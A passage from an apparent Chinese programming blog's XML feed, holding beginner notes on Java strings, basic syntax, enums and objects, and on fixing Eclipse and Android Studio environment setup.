class="keyword">int</span> len = site.length();</span><br><span class="line">        System.out.println( <span class="string">&quot; : &quot;</span> + len );</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="连接字符串"><a href="#连接字符串" class="headerlink" title="连接字符串"></a>连接字符串</h1><p>string1.concat(string2);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[] )</span></span>&#123;</span><br><span class="line">   <span class="comment">//string1.concat(string2);</span></span><br><span class="line">   String str1=<span class="string">&quot;abc&quot;</span>;</span><br><span class="line">   String str2=<span class="string">&quot;def&quot;</span>;</span><br><span class="line">   String str3=str1.concat(str2);</span><br><span class="line">   System.out.print(str3);</span><br><span class="line">      </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="创建格式化字符串"><a href="#创建格式化字符串" class="headerlink" title="创建格式化字符串"></a>创建格式化字符串</h1><p>String 类使用静态方法 format() 返回一个String 对象而不是 PrintStream 对象。</p><p>String 类的静态方法 format() 能用来创建可复用的格式化字符串，而不仅仅是用于一次打印输出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[] )</span></span>&#123;</span><br><span class="line">   <span class="keyword">float</span> a=<span class="number">3.33f</span>;</span><br><span class="line">   <span class="keyword">int</span> intVar=<span class="number">3</span>;</span><br><span class="line">   String stringVar=<span class="string">&quot;abc&quot;</span>;</span><br><span class="line">   System.out.printf(<span class="string">&quot;浮点型变量的值为 &quot;</span> +</span><br><span class="line">                  <span class="string">&quot;%3f, 整型变量的值为 &quot;</span> +</span><br><span class="line">                  <span class="string">&quot; %d, 字符串变量的值为 &quot;</span> +</span><br><span class="line">                  <span class="string">&quot;is %s&quot;</span>, a, intVar, stringVar);</span><br><span class="line">   </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果：<img src="/2020/09/20/Java/JAVA%E7%9A%84string/image-20200920125539988.png" class="lazyload" data-srcset="/2020/09/20/Java/JAVA%E7%9A%84string/image-20200920125539988.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920125539988"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String fs;</span><br><span class="line">fs = String.format(<span class="string">&quot;浮点型变量的值为 &quot;</span> +</span><br><span class="line">                   <span class="string">&quot;%f, 整型变量的值为 &quot;</span> +</span><br><span class="line">                   <span class="string">&quot; %d, 字符串变量的值为 &quot;</span> +</span><br><span class="line">                   <span class="string">&quot; %s&quot;</span>, floatVar, intVar, stringVar);</span><br></pre></td></tr></table></figure><p>输出一个限定小数点的浮点数</p><p>使用String.format和DecimalFormat.format </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> pi=<span class="number">3.142</span>;</span><br><span class="line">    <span class="comment">//3.14</span></span><br><span class="line">        System.out.println(String.format(<span class="string">&quot;%.2f&quot;</span>, pi));</span><br><span class="line">        System.out.println(<span class="keyword">new</span> DecimalFormat(<span class="string">&quot;0.00&quot;</span>).format(pi));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA基础语法</title>
      <link href="/2020/09/20/Java/JAVA%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
      <url>/2020/09/20/Java/JAVA%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-基础语法"><a href="#Java-基础语法" class="headerlink" title="Java 基础语法"></a>Java 基础语法</h1><p>一个 Java 程序可以认为是一系列对象的集合，而这些对象通过调用彼此的方法来协同工作。下面简要介绍下类、对象、方法和实例变量的概念。</p><ul><li><strong>对象</strong>：对象是类的一个实例，有状态和行为。例如，一条狗是一个对象，它的状态有：颜色、名字、品种；行为有：摇尾巴、叫、吃等。</li><li><strong>类</strong>：类是一个模板，它描述一类对象的行为和状态。</li><li><strong>方法</strong>：方法就是行为，一个类可以有很多方法。逻辑运算、数据修改以及所有动作都是在方法中完成的。</li><li><strong>实例变量</strong>：每个对象都有独特的实例变量，对象的状态由这些实例变量的值决定。</li></ul><h1 id="Java修饰符"><a href="#Java修饰符" class="headerlink" title="Java修饰符"></a>Java修饰符</h1><p>像其他语言一样，Java可以使用修饰符来修饰类中方法和属性。主要有两类修饰符：</p><ul><li>访问控制修饰符 : default, public , protected, private</li><li>非访问控制修饰符 : final, abstract, static, synchronized</li></ul><h1 id="Java-枚举"><a href="#Java-枚举" class="headerlink" title="Java 枚举"></a>Java 枚举</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FreshJuice</span> </span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">enum</span> <span class="title">FreshJuiceSize</span></span>&#123; SMALL, MEDIUM , LARGE &#125;</span><br><span class="line">   FreshJuiceSize size;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">      FreshJuice juice = <span class="keyword">new</span> FreshJuice();</span><br><span class="line">      juice.size = FreshJuice.FreshJuiceSize.MEDIUM  ;</span><br><span class="line">      System.out.println(juice.size);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果：<img src="/2020/09/20/Java/JAVA%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20200920121136488.png" class="lazyload" data-srcset="/2020/09/20/Java/JAVA%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20200920121136488.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920121136488"></p><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p>在 Java 中，接口可理解为对象间相互通信的协议。接口在继承中扮演着很重要的角色。</p><p>接口只定义派生要用到的方法，但是方法的具体实现完全取决于派生类。</p><h1 id="对象（与c大同小异）"><a href="#对象（与c大同小异）" class="headerlink" title="对象（与c大同小异）"></a>对象（与c大同小异）</h1><p>对象是根据类创建的。在Java中，使用关键字 new 来创建一个新的对象。创建对象需要以下三步：</p><ul><li><strong>声明</strong>：声明一个对象，包括对象名称和对象类型。</li><li><strong>实例化</strong>：使用关键字 new 来创建一个对象。</li><li><strong>初始化</strong>：使用 new 创建对象时，会调用构造方法初始化对象0。</li><li>可以直接在类中定义主函数。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Puppy</span></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> puppyAge;<span class="comment">//构造函数</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">Puppy</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">      <span class="comment">// 这个构造器仅有一个参数：name</span></span><br><span class="line">      System.out.println(<span class="string">&quot;小狗的名字是 : &quot;</span> + name ); </span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">( <span class="keyword">int</span> age )</span></span>&#123;</span><br><span class="line">       puppyAge = age;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">( )</span></span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;小狗的年龄为 : &quot;</span> + puppyAge ); </span><br><span class="line">       <span class="keyword">return</span> puppyAge;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">      <span class="comment">/* 创建对象 */</span></span><br><span class="line">      Puppy myPuppy = <span class="keyword">new</span> Puppy( <span class="string">&quot;tommy&quot;</span> );<span class="comment">//构造函数</span></span><br><span class="line">      <span class="comment">/* 通过方法来设定age */</span></span><br><span class="line">      myPuppy.setAge( <span class="number">2</span> );</span><br><span class="line">      <span class="comment">/* 调用另一个方法获取age */</span></span><br><span class="line">      myPuppy.getAge( );</span><br><span class="line">      <span class="comment">/*你也可以像下面这样访问成员变量 */</span></span><br><span class="line">      System.out.println(<span class="string">&quot;变量值 : &quot;</span> + myPuppy.puppyAge ); </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：<img src="/2020/09/20/Java/JAVA%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20200920121602581.png" class="lazyload" data-srcset="/2020/09/20/Java/JAVA%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20200920121602581.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920121602581"></p><h1 id="源文件声明规则"><a href="#源文件声明规则" class="headerlink" title="源文件声明规则"></a>源文件声明规则</h1><p>在本节的最后部分，我们将学习源文件的声明规则。当在一个源文件中定义多个类，并且还有import语句和package语句时，要特别注意这些规则。</p><ul><li>一个源文件中只能有一个 public 类</li><li>一个源文件可以有多个非 public 类</li><li>源文件的名称应该和 public 类的类名保持一致。例如：源文件中 public 类的类名是 Employee，那么源文件应该命名为Employee.java。</li><li>如果一个类定义在某个包中，那么 package 语句应该在源文件的首行。</li><li>如果源文件包含 import 语句，那么应该放在 package 语句和类定义之间。如果没有 package 语句，那么 import 语句应该在源文件中最前面。</li><li>import 语句和 package 语句对源文件中定义的所有类都有效。在同一源文件中，不能给不同的类不同的包声明。</li></ul><p>类有若干种访问级别，并且类也分不同的类型：抽象类和 final 类等。这些将在访问控制章节介绍。</p><p>除了上面提到的几种类型，Java 还有一些特殊的类，如：<a href="https://www.runoob.com/java/java-inner-class.html">内部类</a>、<a href="https://www.runoob.com/java/java-anonymous-class.html">匿名类</a>。</p><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>文件结构：<img src="/2020/09/20/Java/JAVA%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20200920122453079.png" class="lazyload" data-srcset="/2020/09/20/Java/JAVA%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20200920122453079.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920122453079"></p><p>两个java文件在同个文件夹里，可以直接package test1;导入其中的类</p><p><strong>Employee.java：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test1;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> </span>&#123;</span><br><span class="line"> String name;</span><br><span class="line">   <span class="keyword">int</span> age;</span><br><span class="line">   String designation;</span><br><span class="line">   <span class="keyword">double</span> salary;</span><br><span class="line">   <span class="comment">// Employee 类的构造器</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 设置age的值</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">empAge</span><span class="params">(<span class="keyword">int</span> empAge)</span></span>&#123;</span><br><span class="line">      age =  empAge;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/* 设置designation的值*/</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">empDesignation</span><span class="params">(String empDesig)</span></span>&#123;</span><br><span class="line">      designation = empDesig;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/* 设置salary的值*/</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">empSalary</span><span class="params">(<span class="keyword">double</span> empSalary)</span></span>&#123;</span><br><span class="line">      salary = empSalary;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/* 打印信息 */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printEmployee</span><span class="params">()</span></span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;名字:&quot;</span>+ name );</span><br><span class="line">      System.out.println(<span class="string">&quot;年龄:&quot;</span> + age );</span><br><span class="line">      System.out.println(<span class="string">&quot;职位:&quot;</span> + designation );</span><br><span class="line">      System.out.println(<span class="string">&quot;薪水:&quot;</span> + salary);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>test1.java:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">      <span class="comment">/* 使用构造器创建两个对象 */</span></span><br><span class="line">      Employee empOne = <span class="keyword">new</span> Employee(<span class="string">&quot;RUNOOB1&quot;</span>);</span><br><span class="line">      Employee empTwo = <span class="keyword">new</span> Employee(<span class="string">&quot;RUNOOB2&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 调用这两个对象的成员方法</span></span><br><span class="line">      empOne.empAge(<span class="number">26</span>);</span><br><span class="line">      empOne.empDesignation(<span class="string">&quot;高级程序员&quot;</span>);</span><br><span class="line">      empOne.empSalary(<span class="number">1000</span>);</span><br><span class="line">      empOne.printEmployee();</span><br><span class="line"> </span><br><span class="line">      empTwo.empAge(<span class="number">21</span>);</span><br><span class="line">      empTwo.empDesignation(<span class="string">&quot;菜鸟程序员&quot;</span>);</span><br><span class="line">      empTwo.empSalary(<span class="number">500</span>);</span><br><span class="line">      empTwo.printEmployee();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果：<img src="/2020/09/20/Java/JAVA%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20200920122720468.png" class="lazyload" data-srcset="/2020/09/20/Java/JAVA%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20200920122720468.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920122720468"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java+eclipse配置问题</title>
      <link href="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/java-eclipse%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
      <url>/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/java-eclipse%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>1.下载完eclipse后建项目出现了</p><p><img src="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/java-eclipse%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/image-20200920105617679.png" class="lazyload" data-srcset="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/java-eclipse%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/image-20200920105617679.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920105617679"></p><p>2.可能出现的原因：<a href="https://cloud.tencent.com/developer/article/1043538%E4%BD%86%E6%88%91%E4%B8%8D%E6%98%AF%E8%BF%99%E4%B8%AA%E5%8E%9F%E5%9B%A0%EF%BC%9B%E6%89%93%E5%BC%80jre%E7%9A%84%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%91%E7%8E%B0%E6%98%AF%E4%B8%80%E4%B8%AA%E6%97%A0%E6%95%88%E8%B7%AF%E5%BE%84">https://cloud.tencent.com/developer/article/1043538但我不是这个原因；打开jre的配置环境发现是一个无效路径</a></p><p><img src="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/java-eclipse%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/image-20200920105745943.png" class="lazyload" data-srcset="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/java-eclipse%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/image-20200920105745943.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920105745943"></p><p><img src="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/java-eclipse%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/image-20200920105800704.png" class="lazyload" data-srcset="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/java-eclipse%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/image-20200920105800704.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920105800704"></p><p>后面打开安装的jdk发现里面没jre文件夹，根据链接<a href="https://blog.csdn.net/ksws01/article/details/104684182%E7%9F%A5%E9%81%93%E4%BA%86jdk%E5%90%8E%E7%BB%AD%E7%89%88%E6%9C%AC%E4%B8%8D%E8%83%BD%E4%BA%A7%E7%94%9Fjre%EF%BC%8C%E6%B3%A8%E6%84%8F%E8%A6%81%E7%94%A8%E6%9C%89%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90%E7%9A%84powershell%EF%BC%8C%E4%B8%8D%E7%84%B6%E4%BC%9A%E6%B7%BB%E5%8A%A0%E5%A4%B1%E8%B4%A5%E3%80%82%E6%B7%BB%E5%8A%A0%E5%AE%8C%E4%B9%8B%E5%90%8E%E6%94%B9%E5%8F%98%E4%B8%80%E4%B8%8Bjre%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8D%B3%E5%8F%AF%E8%BF%90%E8%A1%8C">https://blog.csdn.net/ksws01/article/details/104684182知道了jdk后续版本不能产生jre，注意要用有管理权限的powershell，不然会添加失败。添加完之后改变一下jre的环境即可运行</a></p><p><img src="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/java-eclipse%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/image-20200920110001359.png" class="lazyload" data-srcset="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/java-eclipse%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/image-20200920110001359.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920110001359"></p><p><img src="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/java-eclipse%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/image-20200920110021040.png" class="lazyload" data-srcset="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/java-eclipse%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/image-20200920110021040.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920110021040"></p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Studio配置环境</title>
      <link href="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Android-Studio%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/"/>
      <url>/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Android-Studio%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>教程:<a href="https://www.cnblogs.com/yanglh6-jyx/p/Android_AS_Configuration.html">https://www.cnblogs.com/yanglh6-jyx/p/Android_AS_Configuration.html</a></p><p>SDK TOOLS安装过程最后先解析一下dl.google.com 能ping到的主机</p><p>然后修改一下host文件</p><p>这样下载速度就相对快一点</p><p><img src="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Android-Studio%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/image-20200920014745003.png" class="lazyload" data-srcset="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Android-Studio%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/image-20200920014745003.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920014745003"><img src="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Android-Studio%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/image-20200920014821877.png" class="lazyload" data-srcset="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Android-Studio%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/image-20200920014821877.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920014821877"></p><p><img 